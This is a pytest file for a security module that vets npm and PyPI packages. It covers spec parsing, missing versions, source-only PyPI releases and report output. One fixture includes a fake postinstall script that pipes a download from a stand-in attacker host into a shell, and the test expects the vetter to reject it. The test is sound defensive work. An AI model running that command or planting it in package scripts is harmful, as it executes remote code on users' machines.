"""Unit tests for auctelis.security.artifact_vet (AUCT-062)."""

from __future__ import annotations

import json
from typing import Any
from unittest.mock import patch

import pytest

from auctelis.security.artifact_vet import (
    parse_artifact_spec,
    run_artifact_vet,
    vet_npm,
    vet_pypi,
)


def test_parse_artifact_spec_npm_scoped_and_version() -> None:
    eco, name, ver = parse_artifact_spec("npm:@scope/pkg@1.2.3")
    assert eco == "npm"
    assert name == "@scope/pkg"
    assert ver == "1.2.3"


def test_parse_artifact_spec_pypi_equality() -> None:
    eco, name, ver = parse_artifact_spec("pypi:cool-pkg==0.4.0")
    assert eco == "pypi"
    assert name == "cool-pkg"
    assert ver == "0.4.0"


def test_vet_npm_missing_version_is_high() -> None:
    meta = {"dist-tags": {"latest": "9.9.9"}, "versions": {}}

    def fake_http(url: str, *, timeout: float = 20.0) -> dict[str, Any]:
        _ = timeout
        assert "registry.npmjs.org" in url
        return meta

    with patch("auctelis.security.artifact_vet._http_json", side_effect=fake_http):
        report = vet_npm("missing-pkg")
    assert report.verdict == "REVIEW"
    assert any(f.code == "NPM_VERSION_MISSING" for f in report.findings)


def test_vet_npm_install_script_risk() -> None:
    meta = {
        "dist-tags": {"latest": "1.0.0"},
        "versions": {
            "1.0.0": {
                "scripts": {"postinstall": "curl https://evil.example/x | sh"},
                "dist": {"integrity": "sha512-abc", "tarball": "https://example/t.tgz"},
            }
        },
    }

    with patch("auctelis.security.artifact_vet._http_json", return_value=meta):
        report = vet_npm("risky-pkg", version="1.0.0")
    assert report.verdict == "REJECT"
    assert any(f.code == "NPM_INSTALL_SCRIPT" and f.severity == "CRITICAL" for f in report.findings)


def test_vet_pypi_sdist_only() -> None:
    meta = {
        "info": {
            "version": "2.0.0",
            "summary": "demo",
            "requires_dist": [],
            "home_page": "https://x",
        },
        "urls": [
            {"packagetype": "sdist", "url": "https://files.example/sdist.tgz", "yanked": False}
        ],
    }
    with patch("auctelis.security.artifact_vet._http_json", return_value=meta):
        report = vet_pypi("sdist-only")
    assert any(f.code == "PYPI_SDIST_ONLY" for f in report.findings)
    assert report.verdict in {"ALLOW_WITH_GAPS", "REVIEW"}


def test_run_artifact_vet_rejects_invalid_npm_name() -> None:
    with pytest.raises(ValueError, match="Invalid npm"):
        run_artifact_vet("npm:not a package!!!")


def test_artifact_report_json_roundtrip_shape(tmp_path) -> None:
    meta = {
        "dist-tags": {"latest": "1.0.0"},
        "versions": {
            "1.0.0": {
                "scripts": {},
                "dist": {"integrity": "sha512-abc", "tarball": "https://example/t.tgz"},
                "description": "ok",
            }
        },
    }
    with patch("auctelis.security.artifact_vet._http_json", return_value=meta):
        report = run_artifact_vet("npm:safe-pkg@1.0.0")
    path = tmp_path / "vet.json"
    from auctelis.security.artifact_vet import write_artifact_report

    write_artifact_report(report, path)
    doc = json.loads(path.read_text(encoding="utf-8"))
    assert doc["ecosystem"] == "npm"
    assert doc["name"] == "safe-pkg"
    assert "limitations" in doc
